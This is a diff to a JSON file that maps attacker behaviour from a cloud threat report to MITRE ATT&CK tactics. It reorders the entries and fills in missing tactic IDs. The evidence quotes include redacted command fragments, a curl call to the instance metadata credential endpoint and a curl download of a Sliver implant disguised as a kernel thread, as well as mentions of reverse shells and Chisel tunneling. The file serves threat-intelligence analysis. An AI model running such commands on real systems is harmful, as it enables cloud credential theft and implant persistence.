@@ -14,6 +14,19 @@
       ]
     },
     {
+      "tactic_id": "TA0002",
+      "tactic_name": "Execution",
+      "techniques": [
+        {
+          "technique_id": "T1059.006",
+          "technique_name": "Command and Scripting Interpreter: Python",
+          "inferred": false,
+          "evidence_quote": "The adversary leveraged the cloud provider's orchestration tool in an attempt to execute python reverse shells.",
+          "validated": false
+        }
+      ]
+    },
+    {
       "tactic_id": "TA0003",
       "tactic_name": "Persistence",
       "techniques": [
@@ -23,6 +36,19 @@
           "inferred": false,
           "evidence_quote": "The adversary created a cron job to download and run the Silver implant upon reboot.",
           "validated": false
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0006",
+      "tactic_name": "Credential Access",
+      "techniques": [
+        {
+          "technique_id": "T1552.005",
+          "technique_name": "Cloud Instance Metadata API",
+          "inferred": false,
+          "evidence_quote": "The adversary attempted to harvest the cloud credentials via the Instance metadata service API. curl -k http://[REDACTED IP Address]/latest/meta-data/iam/security-credentials/[REDACTED IAM Role]",
+          "validated": true
         }
       ]
     },
@@ -54,46 +80,6 @@
       ]
     },
     {
-      "tactic_id": "TA0006",
-      "tactic_name": "Credential Access",
-      "techniques": [
-        {
-          "technique_id": "T1552.005",
-          "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
-          "inferred": false,
-          "evidence_quote": "The adversary attempted to harvest the cloud credentials via the Instance metadata service API. curl -k http://[REDACTED IP Address]/latest/meta-data/iam/security-credentials/[REDACTED IAM Role]",
-          "validated": true
-        }
-      ]
-    },
-    {
-      "tactic_id": "TA0011",
-      "tactic_name": "Command and Control",
-      "techniques": [
-        {
-          "technique_id": "T1059.006",
-          "technique_name": "Command and Scripting Interpreter: Python",
-          "inferred": false,
-          "evidence_quote": "The adversary leveraged the cloud provider's orchestration tool in an attempt to execute python reverse shells.",
-          "validated": false
-        },
-        {
-          "technique_id": "T1105",
-          "technique_name": "Ingress Tool Transfer",
-          "inferred": false,
-          "evidence_quote": "Curl was used in an attempt to download a Sliver implant.",
-          "validated": false
-        },
-        {
-          "technique_id": "T1572",
-          "technique_name": "Protocol Tunneling",
-          "inferred": false,
-          "evidence_quote": "Activity included attempted harvesting of cloud instance credentials and the use of Chisel to attempt protocol tunneling using an external SOCKS proxy.",
-          "validated": false
-        }
-      ]
-    },
-    {
       "tactic_id": "TA0008",
       "tactic_name": "Lateral Movement",
       "techniques": [
@@ -109,6 +95,26 @@
           "technique_name": "Remote Services: Remote Desktop Protocol",
           "inferred": false,
           "evidence_quote": "Utilizing the established Chisel tunnel, the adversary attempted to connect to various endpoints across ports indicating interest in SSH, RDP, SQLServer and MySQL services.",
+          "validated": false
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0011",
+      "tactic_name": "Command and Control",
+      "techniques": [
+        {
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "inferred": false,
+          "evidence_quote": "Curl was used in an attempt to download a Sliver implant.",
+          "validated": false
+        },
+        {
+          "technique_id": "T1572",
+          "technique_name": "Protocol Tunneling",
+          "inferred": false,
+          "evidence_quote": "Activity included attempted harvesting of cloud instance credentials and the use of Chisel to attempt protocol tunneling using an external SOCKS proxy.",
           "validated": false
         }
       ]
@@ -262,7 +268,7 @@
         "technique_id": "T1053.003",
         "technique_name": "Scheduled Task/Job: Cron",
         "description": "The adversary created a cron job to persist by downloading and executing the Sliver implant upon every reboot, masquerading the process as a legitimate kernel thread.",
-        "tactic_id": "",
+        "tactic_id": "TA0003",
         "evidence_quote": "The adversary created a cron job to download and run the Silver implant upon reboot. curl hxxp://[REDACTED]... bash -c \"exec -a '[kthread/4:3-bus]'\"",
         "evidence_sources": [
           "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
@@ -274,7 +280,7 @@
         "technique_id": "T1033",
         "technique_name": "System Owner/User Discovery",
         "description": "The adversary ran host reconnaissance commands (whoami, ps, uname, id) and reached out to external domains for IP address information.",
-        "tactic_id": "",
+        "tactic_id": "TA0007",
         "evidence_quote": "Various discovery commands were executed such as whoami.ps.uname.id in addition to reaching out to an external domain to IP address information.",
         "evidence_sources": [
           "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
@@ -316,7 +322,7 @@
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "description": "The adversary used curl to download the Sliver implant from a remote attacker-controlled server into /dev/shm/ to avoid on-disk detection.",
-        "tactic_id": "",
+        "tactic_id": "TA0011",
         "evidence_quote": "Curl was used in an attempt to download a Sliver implant.",
         "evidence_sources": [
           "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
@@ -328,7 +334,7 @@
         "technique_id": "T1059.006",
         "technique_name": "Command and Scripting Interpreter: Python",
         "description": "The adversary leveraged the cloud orchestration tool to attempt to execute Python reverse shells connecting back to attacker-controlled infrastructure.",
-        "tactic_id": "",
+        "tactic_id": "TA0002",
         "evidence_quote": "The adversary leveraged the cloud provider's orchestration tool in an attempt to execute python reverse shells.",
         "evidence_sources": [
           "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
@@ -342,7 +348,7 @@
         "technique_id": "T1572",
         "technique_name": "Protocol Tunneling",
         "description": "The adversary executed a compiled Chisel tool to establish a reverse SOCKS proxy tunnel between the compromised cloud-hosted server and attacker infrastructure.",
-        "tactic_id": "",
+        "tactic_id": "TA0011",
         "evidence_quote": "The adversary executed a customer compiled version of the Chisel protocol tunneling tool to establish a reverse tunnel between the endpoint and adversary infrastructure.",
         "evidence_sources": [
           "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
@@ -354,7 +360,7 @@
         "technique_id": "T1021.004",
         "technique_name": "Remote Services: SSH",
         "description": "Utilizing the Chisel tunnel, the adversary attempted lateral movement to multiple internal endpoints via SSH, RDP, SQL Server and MySQL ports.",
-        "tactic_id": "",
+        "tactic_id": "TA0008",
         "evidence_quote": "Utilizing the established Chisel tunnel, the adversary attempted to connect to various endpoints across ports indicating interest in SSH, RDP, SQLServer and MySQL services.",
         "evidence_sources": [
           "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
